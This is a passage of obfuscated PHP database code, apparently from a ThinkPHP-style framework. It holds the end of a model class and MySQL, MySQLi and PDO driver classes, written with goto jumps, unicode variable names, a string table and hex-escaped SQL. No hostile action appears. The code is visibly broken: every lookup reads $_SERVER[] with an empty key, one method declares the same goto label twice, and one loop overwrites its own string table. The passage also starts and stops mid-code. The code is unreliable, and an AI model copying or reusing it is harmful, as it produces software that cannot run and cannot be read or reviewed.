$this->setProperty($FϪ, $c); } } goto bݕ; c͸͘: $D =& $_SERVER[]; if ($D[33] === $C && $this->db) { return $this->db; } static $B˅ = array(); goto F޷; Dػ: if (!empty($this->name) && $this->autoCheckFields) { $this->_checkTableInfo(); } return $this; goto A; bݕ: $B˅[$C] = $Eލӭ; $this->db = $Eڃ[$C]; $this->_after_db(); goto Dػ; A: } protected function _after_db() { } public function getModelName() { if (empty($this->name)) { $F槄 = get_class($this); if ($F槄 == $_SERVER[][342]) { return $this->name; } $this->name = substr($F槄, 0, -5); } return $this->name; } public function getTableName() { $CȠڮ =& $_SERVER[]; if (empty($this->trueTableName)) { $DҎ = !empty($this->tablePrefix) ? $this->tablePrefix : $CȠڮ[33]; if (!empty($this->tableName)) { $DҎ .= $this->tableName; } else { $DҎ .= think_parse_name($this->name); } $this->trueTableName = strtolower($DҎ); } return (!empty($this->dbName) ? $this->dbName . $CȠڮ[94] : $CȠڮ[33]) . $this->trueTableName; } public function startTrans() { $this->commit(); $this->db->startTrans(); return; } public function commit() { return $this->db->commit(); } public function rollback() { return $this->db->rollback(); } public function getError() { return $this->error; } public function getDbError() { return $this->db->getError(); } public function getLastInsID() { return $this->db->getLastInsID(); } public function getLastSql() { return $this->db->getLastSql($this->name); } public function _sql() { return $this->getLastSql(); } public function getPk() { $E =& $_SERVER[]; return isset($this->fields[$E[247]]) ? $this->fields[$E[247]] : $this->pk; } public function getDbFields() { $F =& $_SERVER[]; if (isset($this->options[$F[275]])) { $Cޟ = $this->db->getFields($this->options[$F[275]]); return $Cޟ ? array_keys($Cޟ) : !1; } if ($this->fields) { $Cޟ = $this->fields; unset($Cޟ[$F[246]], $Cޟ[$F[247]], $Cޟ[$F[248]], $Cޟ[$F[245]]); return $Cޟ; } return !1; } public function data($d = '') { $Dނ =& $_SERVER[]; if ($Dނ[33] === $d && !empty($this->data)) { return $this->data; } if (is_object($d)) { $d = get_object_vars($d); } elseif (is_string($d)) { parse_str($d, $d); } elseif (!is_array($d)) { think_exception(think_lang($Dނ[267])); } $this->data = $d; return $this; } public function join($A) { $B =& $_SERVER[]; if (is_array($A)) { $this->options[$B[278]] = $A; } elseif (!empty($A)) { $this->options[$B[278]][] = $A; } return $this; } public function union($cίٮ, $bɘ = false) { goto f쐮; aʋ: return $this; goto aю㸋; eՇ: if (is_object($cίٮ)) { $cίٮ = get_object_vars($cίٮ); } if (is_string($cίٮ)) { $aĿ = $cίٮ; } elseif (is_array($cίٮ)) { if (isset($cίٮ[0])) { $this->options[$aڑ[343]] = array_merge($this->options[$aڑ[343]], $cίٮ); return $this; } else { $aĿ = $cίٮ; } } else { think_exception(think_lang($aڑ[267])); } $this->options[$aڑ[343]][] = $aĿ; goto aʋ; f쐮: $aڑ =& $_SERVER[]; if (empty($cίٮ)) { return $this; } if ($bɘ) { $this->options[$aڑ[343]][$aڑ[344]] = !0; } goto eՇ; aю㸋: } public function cache($bڅ綃 = true, $b󲅕 = null, $F = '') { $fȞ =& $_SERVER[]; if (!1 !== $bڅ綃) { $this->options[$fȞ[345]] = array($fȞ[92] => $bڅ綃, $fȞ[335] => $b󲅕, $fȞ[29] => $F); } return $this; } public function field($Aߗǰݿ, $cק驍 = false) { $eꤽ =& $_SERVER[]; if (!0 === $Aߗǰݿ) { $E = $this->getDbFields(); $Aߗǰݿ = $E ? $E : $eꤽ[182]; } elseif ($cק驍) { if (is_string($Aߗǰݿ)) { $Aߗǰݿ = explode($eꤽ[47], $Aߗǰݿ); } $E = $this->getDbFields(); $Aߗǰݿ = $E ? array_diff($E, $Aߗǰݿ) : $Aߗǰݿ; } $this->options[$eꤽ[269]] = $Aߗǰݿ; return $this; } public function scope($b = '', $D扑䃱 = NULL) { $bʧ =& $_SERVER[]; if ($bʧ[33] === $b) { if (isset($this->_scope[$bʧ[34]])) { $fƬ = $this->_scope[$bʧ[34]]; } else { return $this; } } elseif (is_string($b)) { $dă㐕 = explode($bʧ[47], $b); $fƬ = array(); foreach ($dă㐕 as $dБ) { if (!isset($this->_scope[$dБ])) { continue; } $fƬ = array_merge($fƬ, $this->_scope[$dБ]); } if (!empty($D扑䃱) && is_array($D扑䃱)) { $fƬ = array_merge($fƬ, $D扑䃱); } } elseif (is_array($b)) { $fƬ = $b; } if (is_array($fƬ) && !empty($fƬ)) { $this->options = array_merge($this->options, array_change_key_case($fƬ)); } return $this; } public function where($F, $E֓ = null) { $B﬇ =& $_SERVER[]; if (!is_null($E֓) && is_string($F)) { if (!is_array($E֓)) { $E֓ = func_get_args(); array_shift($E֓); } $E֓ = array_map(array($this->db, $B﬇[339]), $E֓); $F = vsprintf($F, $E֓); } elseif (is_object($F)) { $F = get_object_vars($F); } elseif (is_array($F)) { foreach ($F as $cլ => $e) { if ((is_numeric($cլ) || !$cլ) && is_string($e)) { if (strpos($e, $B﬇[346]) === 0) { continue; } think_trace($B﬇[347], $B﬇[33], $B﬇[46]); die; } } } if (is_string($F) && $B﬇[33] != $F) { $f = array(); $f[$B﬇[348]] = $F; $F = $f; } if (isset($this->options[$B﬇[271]])) { $this->options[$B﬇[271]] = array_merge($this->options[$B﬇[271]], $F); } else { $this->options[$B﬇[271]] = $F; } return $this; } public function limit($béٔ, $cַו = null) { $Cŭ =& $_SERVER[]; $this->options[$Cŭ[288]] = is_null($cַו) ? $béٔ : $béٔ . $Cŭ[47] . $cַו; return $this; } public function page($f, $f֓ԅ = null) { $A =& $_SERVER[]; $this->options[$A[349]] = is_null($f֓ԅ) ? $f : $f . $A[47] . $f֓ԅ; return $this; } public function comment($Eڞ) { $this->options[$_SERVER[][350]] = $Eڞ; return $this; } public function setProperty($Eٞӌ, $d) { if (property_exists($this, $Eٞӌ)) { $this->{$Eٞӌ} = $d; } return $this; } } goto A; Bß: class DbMysql extends Db { public function __construct($A׫蚊 = '') { $d嶼 =& $_SERVER[]; if (!extension_loaded($d嶼[765])) { think_exception(think_lang($d嶼[10]) . $d嶼[845]); } if (!empty($A׫蚊)) { $this->config = $A׫蚊; if (empty($this->config[$d嶼[13]])) { $this->config[$d嶼[13]] = $d嶼[33]; } } } public function connect($Eڢ = '', $AƄͱ = 0, $F푹 = false) { $C =& $_SERVER[]; if (!isset($this->linkID[$AƄͱ])) { goto F¾땾; b܅: mysql_query($C[850] . think_config($C[851]) . $C[55], $this->linkID[$AƄͱ]); if ($E > $C[852]) { mysql_query($C[853], $this->linkID[$AƄͱ]); } $this->connected = !0; goto D; F¾땾: if (empty($Eڢ)) { $Eڢ = $this->config; } $D = $Eڢ[$C[846]] . ($Eڢ[$C[847]] ? "\72{$Eڢ[$C[847]]}" : $C[33]); $Bԕ = !empty($Eڢ[$C[13]][$C[14]]) ? $Eڢ[$C[13]][$C[14]] : $this->pconnect; goto d; d: if ($Bԕ) { $this->linkID[$AƄͱ] = mysql_pconnect($D, $Eڢ[$C[848]], $Eڢ[$C[849]], 131072); } else { $this->linkID[$AƄͱ] = mysql_connect($D, $Eڢ[$C[848]], $Eڢ[$C[849]], !0, 131072); } if (!$this->linkID[$AƄͱ] || !empty($Eڢ[$C[17]]) && !mysql_select_db($Eڢ[$C[17]], $this->linkID[$AƄͱ])) { think_exception(mysql_error()); } $E = mysql_get_server_info($this->linkID[$AƄͱ]); goto b܅; D: if (1 != think_config($C[18])) { unset($this->config); } goto C詵; C詵: } return $this->linkID[$AƄͱ]; } public function free() { mysql_free_result($this->queryID); $this->queryID = null; } public function query($Aƞ) { goto bΟ; bα҇: if (!$this->_linkID) { return !1; } $this->queryStr = $Aƞ; if ($this->queryID) { $this->free(); } goto B̉ؗ; B̉ؗ: think_action_status($a[19], 1); think_status($a[20]); $this->queryID = mysql_query($Aƞ, $this->_linkID); goto aۣ; bΟ: $a =& $_SERVER[]; if (0 === stripos($Aƞ, $a[260])) { $this->close(); $this->connected = !1; } $this->initConnect(!1); goto bα҇; aۣ: $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = mysql_num_rows($this->queryID); return $this->getAll(); } goto fש; fש: } public function execute($F݄) { goto f쬆; bԹ: think_status($aͲ[20]); $Ań = mysql_query($F݄, $this->_linkID); $this->debug(); goto DƑ; DƑ: if (!1 === $Ań) { $this->error(); return !1; } else { $this->numRows = mysql_affected_rows($this->_linkID); $this->lastInsID = mysql_insert_id($this->_linkID); return $this->numRows; } goto B; b: $this->queryStr = $F݄; if ($this->queryID) { $this->free(); } think_action_status($aͲ[21], 1); goto bԹ; f쬆: $aͲ =& $_SERVER[]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } goto b; B: } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { mysql_query($_SERVER[][854], $this->_linkID); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $bٯ = mysql_query($_SERVER[][855], $this->_linkID); $this->transTimes = 0; if (!$bٯ) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $c묄 = mysql_query($_SERVER[][856], $this->_linkID); $this->transTimes = 0; if (!$c묄) { $this->error(); return !1; } } return !0; } private function getAll() { $aٓ = array(); if ($this->numRows > 0) { while ($Dَ = mysql_fetch_assoc($this->queryID)) { $aٓ[] = $Dَ; } mysql_data_seek($this->queryID, 0); } return $aٓ; } public function getFields($C) { $f =& $_SERVER[]; $BȨ = $this->query($f[857] . $this->parseKey($C)); $F۹ۋ = array(); if ($BȨ) { foreach ($BȨ as $dї => $Eݿ) { $F۹ۋ[$Eݿ[$f[27]]] = array($f[28] => $Eݿ[$f[27]], $f[29] => $Eݿ[$f[30]], $f[31] => (bool) (strtoupper($Eݿ[$f[32]]) === $f[858]), $f[34] => $Eݿ[$f[35]], $f[36] => strtolower($Eݿ[$f[37]]) == $f[38], $f[39] => strtolower($Eݿ[$f[40]]) == $f[41]); } } return $F۹ۋ; } public function getTables($BԜ꺪 = '') { $e =& $_SERVER[]; if (!empty($BԜ꺪)) { $cޟ۟ = $e[859] . $BԜ꺪 . $e[860]; } else { $cޟ۟ = $e[861]; } $a۰ = $this->query($cޟ۟); $Dٰ = array(); foreach ($a۰ as $C => $fܐ) { $Dٰ[$C] = current($fܐ); } return $Dٰ; } public function replace($Dלݙ, $e· = array()) { $d䐂 =& $_SERVER[]; foreach ($Dלݙ as $AȚ => $b) { $b = $this->parseValue($b); if (is_scalar($b)) { $eƣ[] = $b; $Cɾؕ[] = $this->parseKey($AȚ); } } $c = $d䐂[862] . $this->parseTable($e·[$d䐂[275]]) . $d䐂[863] . implode($d䐂[47], $Cɾؕ) . $d䐂[864] . implode($d䐂[47], $eƣ) . $d䐂[865]; return $this->execute($c); } public function insertAll($A̸, $b = array(), $f򺡂՛ = false) { goto eӯ; eӯ: $f͓߆ý =& $_SERVER[]; if (!is_array($A̸[0])) { return !1; } $bӨ֋ = array_keys($A̸[0]); goto dăƗ; dăƗ: $f = array(); foreach ($A̸ as $bُ) { $f = array(); foreach ($bُ as $Dڬ => $eꍎ) { $eꍎ = $this->parseValue($eꍎ); if (is_scalar($eꍎ)) { $f[] = $eꍎ; } } $f[] = $f͓߆ý[256] . implode($f͓߆ý[47], $f) . $f͓߆ý[865]; } array_walk($bӨ֋, array($this, $f͓߆ý[866])); goto FɄ; FɄ: $BϳǕ = ($f򺡂՛ ? $f͓߆ý[867] : $f͓߆ý[868]) . $f͓߆ý[869] . $this->parseTable($b[$f͓߆ý[275]]) . $f͓߆ý[863] . implode($f͓߆ý[47], $bӨ֋) . $f͓߆ý[870] . implode($f͓߆ý[47], $f); return $this->execute($BϳǕ); goto cƝ; cƝ: } public function close() { if ($this->_linkID) { mysql_close($this->_linkID); } $this->_linkID = null; } public function error() { $f =& $_SERVER[]; $this->error = mysql_errno() . $f[4] . mysql_error($this->_linkID); if ($f[33] != $this->queryStr) { $this->error .= LNG($f[45]) . $this->queryStr; } think_trace($this->error, $f[33], $f[46]); return $this->error; } public function escapeString($F߇ɋ) { if ($this->_linkID) { return mysql_real_escape_string($F߇ɋ, $this->_linkID); } else { return mysql_escape_string($F߇ɋ); } } public function parseKey(&$bۻǝ, $Eĩƨ = true) { $A֊ϋ =& $_SERVER[]; if ($Eĩƨ) { $bۻǝ = $this->parseKeyCheck($bۻǝ); } if ($bۻǝ != $A֊ϋ[182] && !preg_match($A֊ϋ[871], $bۻǝ)) { $bۻǝ = $A֊ϋ[380] . trim($bۻǝ, $A֊ϋ[380]) . $A֊ϋ[380]; } return $bۻǝ; } } class DbMysqli extends Db { public function __construct($c޽抒 = '') { $e =& $_SERVER[]; if (!extension_loaded($e[764])) { think_exception(think_lang($e[10]) . $e[872]); } if (!empty($c޽抒)) { $this->config = $c޽抒; if (empty($this->config[$e[13]])) { $this->config[$e[13]] = $e[33]; } } } public function connect($f͘ = '', $b㾛 = 0) { $dޚ =& $_SERVER[]; if (!isset($this->linkID[$b㾛])) { goto A; eÑ僚: $c = $this->linkID[$b㾛]->server_version; $this->linkID[$b㾛]->query($dޚ[850] . think_config($dޚ[851]) . $dޚ[55]); if ($c > $dޚ[852]) { $this->linkID[$b㾛]->query($dޚ[853]); } goto f; f: $this->connected = !0; if (1 != think_config($dޚ[18])) { unset($this->config); } goto c۬È; A: if (empty($f͘)) { $f͘ = $this->config; } $this->linkID[$b㾛] = new mysqli($f͘[$dޚ[846]], $f͘[$dޚ[848]], $f͘[$dޚ[849]], $f͘[$dޚ[17]], $f͘[$dޚ[847]] ? intval($f͘[$dޚ[847]]) : 3306); if (mysqli_connect_errno()) { think_exception(mysqli_connect_error()); } goto eÑ僚; c۬È: } return $this->linkID[$b㾛]; } public function free() { $this->queryID->free_result(); $this->queryID = null; } public function query($Cȟ) { goto dɗƕ; dȣ: $this->queryStr = $Cȟ; if ($this->queryID) { $this->free(); } think_action_status($d܄[19], 1); goto c綳ϔ; dɗƕ: $d܄ =& $_SERVER[]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } goto dȣ; f̧: $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = $this->queryID->num_rows; $this->numCols = $this->queryID->field_count; return $this->getAll(); } goto f̋; c綳ϔ: think_status($d܄[20]); $this->queryID = $this->_linkID->query($Cȟ); if ($this->_linkID->more_results()) { while (($b˯ = $this->_linkID->next_result()) != NULL) { $b˯->free_result(); } } goto f̧; f̋: } public function execute($Aמ) { goto aě; E: if (!1 === $E) { $this->error(); return !1; } else { $this->numRows = $this->_linkID->affected_rows; $this->lastInsID = $this->_linkID->insert_id; return $this->numRows; } goto aŷ; bשּׁ: think_status($f[20]); $E = $this->_linkID->query($Aמ); $this->debug(); goto E; E: $this->queryStr = $Aמ; if ($this->queryID) { $this->free(); } think_action_status($f[21], 1); goto bשּׁ; aě: $f =& $_SERVER[]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } goto E; aŷ: } public function startTrans() { $this->initConnect(!0); if ($this->transTimes == 0) { $this->_linkID->autocommit(!1); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $D淮 = $this->_linkID->commit(); $this->_linkID->autocommit(!0); $this->transTimes = 0; if (!$D淮) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $b삪 = $this->_linkID->rollback(); $this->transTimes = 0; if (!$b삪) { $this->error(); return !1; } } return !0; } private function getAll() { $c忣 = array(); if ($this->numRows > 0) { for ($c㵴 = 0; $c㵴 < $this->numRows; $c㵴++) { $c忣[$c㵴] = $this->queryID->fetch_assoc(); } $this->queryID->data_seek(0); } return $c忣; } public function getFields($Eٹ) { $B㶗 =& $_SERVER[]; $a = $this->query($B㶗[857] . $this->parseKey($Eٹ)); $BΌǼ = array(); if ($a) { foreach ($a as $Bі => $e) { $BΌǼ[$e[$B㶗[27]]] = array($B㶗[28] => $e[$B㶗[27]], $B㶗[29] => $e[$B㶗[30]], $B㶗[31] => (bool) ($e[$B㶗[32]] === $B㶗[33]), $B㶗[34] => $e[$B㶗[35]], $B㶗[36] => strtolower($e[$B㶗[37]]) == $B㶗[38], $B㶗[39] => strtolower($e[$B㶗[40]]) == $B㶗[41]); } } return $BΌǼ; } public function getTables($A = '') { $d =& $_SERVER[]; $aӭ = !empty($A) ? $d[859] . $A . $d[860] : $d[861]; $eƩ = $this->query($aӭ); $e = array(); if ($eƩ) { foreach ($eƩ as $bᦚђ => $C݊ﳠ) { $e[$bᦚђ] = current($C݊ﳠ); } } return $e; } public function replace($eȍ, $CŮ = array()) { $Eٲ₣ =& $_SERVER[]; foreach ($eȍ as $FޠĠ => $b޷) { $c˄ = $this->parseValue($b޷); if (is_scalar($c˄)) { $Aѫ[] = $c˄; $B[] = $this->parseKey($FޠĠ); } } $Bٷȧ = $Eٲ₣[862] . $this->parseTable($CŮ[$Eٲ₣[275]]) . $Eٲ₣[863] . implode($Eٲ₣[47], $B) . $Eٲ₣[864] . implode($Eٲ₣[47], $Aѫ) . $Eٲ₣[865]; return $this->execute($Bٷȧ); } public function insertAll($D¸ß, $Bʱ = array(), $d = false) { goto bх; C: $Bռ = array(); foreach ($D¸ß as $a컷) { $C = array(); foreach ($a컷 as $fϑ => $b񉱲) { $b񉱲 = $this->parseValue($b񉱲); if (is_scalar($b񉱲)) { $C[] = $b񉱲; } } $Bռ[] = $bڽ[256] . implode($bڽ[47], $C) . $bڽ[865]; } array_walk($D, array($this, $bڽ[866])); goto fɺ; fɺ: $e엝 = $d ? $bڽ[867] : $bڽ[868]; $e = $e엝 . $bڽ[869] . $this->parseTable($Bʱ[$bڽ[275]]) . $bڽ[863] . implode($bڽ[47], $D) . $bڽ[870] . implode($bڽ[47], $Bռ); return $this->execute($e); goto e; bх: $bڽ =& $_SERVER[]; if (!is_array($D¸ß[0])) { return !1; } $D = array_keys($D¸ß[0]); goto C; e: } public function close() { if ($this->_linkID) { $this->_linkID->close(); } $this->_linkID = null; } public function error() { $Bޒ׳ =& $_SERVER[]; $this->error = $this->_linkID->errno . $Bޒ׳[4] . $this->_linkID->error; if ($Bޒ׳[33] != $this->queryStr) { $this->error .= LNG($Bޒ׳[45]) . $this->queryStr; } think_trace($this->error, $Bޒ׳[33], $Bޒ׳[46]); return $this->error; } public function escapeString($Cϕ) { if ($this->_linkID) { return $this->_linkID->real_escape_string($Cϕ); } else { return addslashes($Cϕ); } } public function parseKey(&$Aر, $Dև = true) { $eݮ =& $_SERVER[]; if ($Dև) { $Aر = $this->parseKeyCheck($Aر); } if ($Aر != $eݮ[182] && !preg_match($eݮ[871], $Aر)) { $Aر = $eݮ[380] . trim($Aر, $eݮ[380]) . $eݮ[380]; } return $Aر; } } class DbPdo extends Db { protected $PDOStatement = null; private $table = ''; public function __construct($f޼ = '') { $bጝ =& $_SERVER[]; if (!class_exists($bጝ[873])) { think_exception(think_lang($bጝ[10]) . $bጝ[874]); } if (!empty($f޼)) { $this->config = $f޼; if (empty($this->config[$bጝ[13]])) { $this->config[$bጝ[13]] = array(); } } } public function connect($B = '', $f = 0) { $DǤɦ =& $_SERVER[]; if (!isset($this->linkID[$f])) { goto aɟ; Bރ: if (1 != think_config($DǤɦ[18])) { unset($this->config); } goto a̺; Fֆ: try { $this->linkID[$f] = new PDO($B[$DǤɦ[875]], $B[$DǤɦ[848]], $B[$DǤɦ[849]], $B[$DǤɦ[13]]); } catch (PDOException $d) { think_exception($d->getMessage()); } $this->dbType = $this->_getDsnType($B[$DǤɦ[875]]); if (in_array($this->dbType, array($DǤɦ[876], $DǤɦ[877], $DǤɦ[878], $DǤɦ[879]))) { think_exception($DǤɦ[880] . $this->dbType . $DǤɦ[881] . $this->dbType . $DǤɦ[882]); } goto B; aɟ: if (empty($B)) { $B = $this->config; } $aÜ = !empty($B[$DǤɦ[13]][$DǤɦ[14]]) ? $B[$DǤɦ[13]][$DǤɦ[14]] : $this->pconnect; if ($aÜ) { $B[$DǤɦ[13]][PDO::ATTR_PERSISTENT] = !0; } goto Fֆ; B: if (!$this->linkID[$f]) { think_exception($DǤɦ[883]); } try { $this->linkID[$f]->exec($DǤɦ[884] . think_config($DǤɦ[851])); } catch (Exception $d) { } $this->connected = !0; goto Bރ; a̺: } return $this->linkID[$f]; } public function free() { $this->PDOStatement = null; } public function query($F״Æ, $D = array()) { goto A뾞; f: if (!1 === $this->PDOStatement) { think_exception($this->error()); } $Aވ = $this->PDOStatement->execute($D); $this->debug(); goto A; F۴ޖ: think_action_status($D[19], 1); think_status($D[20]); $this->PDOStatement = $this->_linkID->prepare($F״Æ); goto f; A: if (!1 === $Aވ) { $this->error(); return !1; } else { return $this->getAll(); } goto bӒ; eЄ: $this->queryStr = $F״Æ; if (!empty($D)) { $this->queryStr .= $D[885] . print_r($D, !0) . $D[886]; } if (!empty($this->PDOStatement)) { $this->free(); } goto F۴ޖ; A뾞: $D =& $_SERVER[]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } goto eЄ; bӒ: } public function execute($E, $Cǫ = array()) { goto F洖; F洖: $aƅߏ =& $_SERVER[]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } goto d; FčΪ: $C׫ = $this->PDOStatement->execute($Cǫ); $this->debug(); if (!1 === $C׫) { $this->error(); return !1; } else { $this->numRows = $this->PDOStatement->rowCount(); if ($dΐ || preg_match($aƅߏ[891], $E)) { $this->lastInsID = $this->getLastInsertId(); } return $this->numRows; } goto aΒ͸; d: $this->queryStr = $E; if (!empty($Cǫ)) { $this->queryStr .= $aƅߏ[885] . print_r($Cǫ, !0) . $aƅߏ[886]; } $dΐ = !1; goto c; bԅܠ: think_status($aƅߏ[20]); $this->PDOStatement = $this->_linkID->prepare($E); if (!1 === $this->PDOStatement) { think_exception($this->error()); } goto FčΪ; c: if ($this->dbType == $aƅߏ[879]) { if (preg_match($aƅߏ[887], $this->queryStr, $a)) { $this->table = think_config($aƅߏ[888]) . str_ireplace(think_config($aƅߏ[889]), $aƅߏ[373], $a[2]); $dΐ = (bool) $this->query($aƅߏ[890] . strtoupper($this->table) . $aƅߏ[55]); } } if (!empty($this->PDOStatement)) { $this->free(); } think_action_status($aƅߏ[21], 1); goto bԅܠ; aΒ͸: } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { $this->_linkID->beginTransaction(); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $fٿ = $this->_linkID->commit(); $this->transTimes = 0; if (!$fٿ) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $dמݡ = $this->_linkID->rollback(); $this->transTimes = 0; if (!$dמݡ) { $this->error(); return !1; } } return !0; } private function getAll() { $D = $this->PDOStatement->fetchAll(PDO::FETCH_ASSOC); $this->numRows = count($D); return $D; } public function getFields($B) { goto bْڏ; bْڏ: $C =& $_SERVER[]; $this->initConnect(!0); if (think_config($C[892])) { $Dь = str_replace($C[893], $B, think_config($C[892])); } else { switch ($this->dbType) { case $C[876]: case $C[894]: $Dь = "\x53\x45\114\x45\x43\124\40\x20\x20\143\x6f\154\x75\x6d\x6e\x5f\x6e\x61\x6d\x65\40\x61\163\40\47\x4e\x61\155\145\x27\x2c\40\x20\40\x64\141\164\141\137\x74\x79\160\145\40\141\163\x20\x27\124\x79\x70\145\47\54\x20\40\40\x63\157\x6c\x75\x6d\x6e\137\144\145\x66\141\165\154\x74\40\141\x73\x20\47\x44\145\x66\141\x75\154\164\47\x2c\40\40\40\x69\x73\x5f\156\165\154\154\141\x62\154\145\40\x61\x73\x20\47\116\x75\x6c\x6c\x27\12\11\x9\106\x52\117\x4d\11\x69\x6e\146\157\x72\155\141\x74\151\x6f\x6e\x5f\163\x63\150\145\x6d\141\x2e\x74\141\142\x6c\145\163\40\x41\123\40\164\12\x9\11\112\x4f\x49\x4e\x9\151\x6e\146\x6f\162\155\141\164\x69\x6f\156\x5f\x73\x63\150\145\155\x61\x2e\143\157\154\165\155\156\163\x20\101\x53\x20\143\xa\11\11\117\116\x20\40\x74\x2e\164\x61\x62\154\x65\137\143\x61\x74\141\x6c\x6f\147\x20\x3d\40\x63\56\x74\141\142\x6c\145\x5f\x63\x61\x74\141\x6c\x6f\x67\12\x9\11\101\116\x44\x20\164\56\164\x61\x62\154\145\137\163\143\x68\x65\x6d\141\x20\75\x20\143\56\x74\141\142\154\145\x5f\163\143\x68\145\155\x61\xa\11\x9\x41\116\x44\x20\164\56\x74\x61\x62\154\x65\x5f\x6e\141\155\145\x20\75\40\143\x2e\x74\x61\142\154\145\x5f\156\141\x6d\145\xa\x9\11\x57\x48\105\x52\105\x20\40\40\164\56\x74\141\142\154\145\x5f\x6e\141\x6d\145\x20\75\40\47{$B}\x27"; break; case $C[895]: $Dь = $C[896] . $B . $C[897]; break; case $C[877]: case $C[879]: $Dь = $C[898] . $C[899] . $C[900] . strtoupper($B) . $C[901] . strtoupper($B) . $C[902]; break; case $C[903]: $Dь = $C[904] . $B . $C[905]; break; case $C[878]: break; case $C[906]: default: $Dь = $C[907] . ($this->dbType == $C[906] ? "\140{$B}\x60" : $B); } } goto D; Fʡ㼵: return $cܟ; goto c; D: $D͈ = $this->query($Dь); $cܟ = array(); if ($D͈) { foreach ($D͈ as $C։ => $C) { $C = array_change_key_case($C); $C[$C[28]] = isset($C[$C[28]]) ? $C[$C[28]] : $C[373]; $C[$C[29]] = isset($C[$C[29]]) ? $C[$C[29]] : $C[373]; $C = isset($C[$C[269]]) ? $C[$C[269]] : $C[$C[28]]; $cܟ[$C] = array($C[28] => $C, $C[29] => $C[$C[29]], $C[31] => (bool) (isset($C[$C[102]]) && $C[$C[102]] === $C[33] || isset($C[$C[31]]) && $C[$C[31]] === $C[33]), $C[34] => isset($C[$C[34]]) ? $C[$C[34]] : (isset($C[$C[53]]) ? $C[$C[53]] : $C[373]), $C[36] => isset($C[$C[92]]) ? strtolower($C[$C[92]]) == $C[38] : (isset($C[$C[54]]) ? $C[$C[54]] : !1), $C[39] => isset($C[$C[908]]) ? strtolower($C[$C[908]]) == $C[41] : (isset($C[$C[92]]) ? $C[$C[92]] : !1)); } } goto Fʡ㼵; c: } public function getTables($cΘڱ = '') { $FЃ =& $_SERVER[]; if (think_config($FЃ[909])) { $AɅڥ = str_replace($FЃ[910], $cΘڱ, think_config($FЃ[909])); } else { switch ($this->dbType) { case $FЃ[877]: case $FЃ[879]: $AɅڥ = $FЃ[911]; break; case $FЃ[876]: case $FЃ[894]: $AɅڥ = $FЃ[912]; break; case $FЃ[903]: $AɅڥ = $FЃ[913]; break; case $FЃ[878]: think_exception(think_lang($FЃ[914]) . $FЃ[915]); break; case $FЃ[895]: $AɅڥ = $FЃ[42] . $FЃ[43] . $FЃ[44]; break; case $FЃ[906]: default: if (!empty($cΘڱ)) { $AɅڥ = $FЃ[859] . $cΘڱ . $FЃ[860]; } else { $AɅڥ = $FЃ[861]; } } } $E = $this->query($AɅڥ); $Cǭʿ = array(); foreach ($E as $e => $a݉) { $Cǭʿ[$e] = current($a݉); } return $Cǭʿ; } protected function parseLimit($d饃) { $e馽 =& $_SERVER[]; $fӦם = $e馽[33]; if (!empty($d饃)) { switch ($this->dbType) { case $e馽[903]: case $e馽[895]: $d饃 = explode($e馽[47], $d饃); if (count($d饃) > 1) { $fӦם .= $e馽[48] . $d饃[1] . $e馽[49] . $d饃[0] . $e馽[50]; } else { $fӦם .= $e馽[48] . $d饃[0] . $e馽[50]; } break; case $e馽[876]: case $e馽[894]: break; case $e馽[878]: break; case $e馽[877]: case $e馽[879]: break; case $e馽[906]: default: $fӦם .= $e馽[48] . $d饃 . $e馽[50]; } } return $fӦם; } public function parseKey(&$c, $Cۄ = true) { $d񏾾 =& $_SERVER[]; if ($Cۄ) { $c = $this->parseKeyCheck($c); } if ($this->dbType == $d񏾾[906]) { if ($c != $d񏾾[182] && !preg_match($d񏾾[871], $c)) { $c = $d񏾾[380] . trim($c, $d񏾾[380]) . $d񏾾[380]; } return $c; } else { return parent::parseKey($c); } } public function close() { $this->_linkID = null; } public function error() { $a؊ =& $_SERVER[]; if ($this->PDOStatement) { $eٳ = $this->PDOStatement->errorInfo(); $this->error = $eٳ[1] . $a؊[4] . $eٳ[2]; } else { $this->error = $a؊[33]; } if ($a؊[33] != $this->queryStr) { $this->error .= LNG($a؊[45]) . $this->queryStr; } think_trace($this->error, $a؊[33], $a؊[46]); return $this->error; } public function escapeString($Dٻ) { $F =& $_SERVER[]; switch ($this->dbType) { case $F[903]: case $F[876]: case $F[894]: case $F[906]: return addslashes($Dٻ); case $F[878]: case $F[895]: case $F[877]: case $F[879]: return str_ireplace($F[55], $F[56], $Dٻ); } } protected function parseValue($eʐċ) { $Eؑ =& $_SERVER[]; if (is_string($eʐċ)) { $eʐċ = strpos($eʐċ, $Eؑ[4]) === 0 ? $this->escapeString($eʐċ) : $Eؑ[916] . $this->escapeString($eʐċ) . $Eؑ[916]; } elseif (isset($eʐċ[0]) && is_string($eʐċ[0]) && strtolower($eʐċ[0]) == $Eؑ[293]) { $eʐċ = $this->escapeString($eʐċ[1]); } elseif (is_array($eʐċ)) { $eʐċ = array_map(array($this, $Eؑ[917]), $eʐċ); } elseif (is_bool($eʐċ)) { $eʐċ = $eʐċ ? $Eؑ[86] : $Eؑ[491]; } elseif (is_null($eʐċ)) { $eʐċ = $Eؑ[102]; } return $eʐċ; } public function getLastInsertId() { $A =& $_SERVER[]; switch ($this->dbType) { case $A[903]: case $A[895]: case $A[876]: case $A[894]: case $A[878]: case $A[906]: return $this->_linkID->lastInsertId(); case $A[877]: case $A[879]: $f硉 = $this->table; $BͲ = $this->query("\x53\105\114\105\x43\124\x20{$f硉}\56\143\x75\162\x72\166\x61\x6c\40\x63\x75\162\x72\x76\x61\x6c\40\106\x52\117\115\40\144\165\x61\154"); return $BͲ ? $BͲ[0][$A[918]] : 0; } } } goto a͈מ; eă: class CacheLockRedis { public function 